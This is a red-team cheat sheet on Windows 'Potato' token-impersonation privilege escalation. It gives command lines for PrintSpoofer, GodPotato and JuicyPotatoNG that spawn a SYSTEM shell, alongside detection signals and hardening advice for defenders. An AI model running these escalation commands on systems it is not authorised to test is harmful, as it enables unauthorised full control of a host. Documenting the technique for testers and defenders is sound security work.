---
title: "Token Impersonation (Potato)"
category: "red-team"
tags: ["privesc", "windows", "tokens"]
platform: "windows"
mitre: ["T1134.001"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# Token Impersonation (Potato attacks)

## TL;DR
A service account with `SeImpersonatePrivilege` (e.g. IIS, MSSQL) can coerce a SYSTEM authentication and impersonate its token → escalation to SYSTEM.

## Prerequisite
```powershell
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
```

## Tools (pick by version/context)
```powershell
# PrintSpoofer – when the spooler / named pipe is available
.\PrintSpoofer64.exe -i -c cmd

# GodPotato – modern, broad compatibility (.NET)
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

# JuicyPotatoNG – DCOM/OXID
.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
```

## How it works (short version)
1. Coerce a SYSTEM authentication (RPC/DCOM/named pipe).
2. Capture and impersonate the SYSTEM token (`SeImpersonatePrivilege`).
3. Run a process in the SYSTEM context.

## Detection (Blue Team)
- Named pipe impersonation, a child process of a service account running as SYSTEM.
- Sysmon Event 1 with an unusual parent→child (`w3wp.exe` → `cmd.exe` as SYSTEM).
- DCOM/OXID resolver anomalies.

## Mitigation / Hardening
- Remove `SeImpersonatePrivilege` where unneeded (carefully — services require it).
- Patching (some vectors are patched), disable the unused Spooler.
- Segregate service accounts, gMSA, EDR monitoring.

## Sources
- [GodPotato](https://github.com/BeichenDream/GodPotato)
- [MITRE T1134.001](https://attack.mitre.org/techniques/T1134/001/)
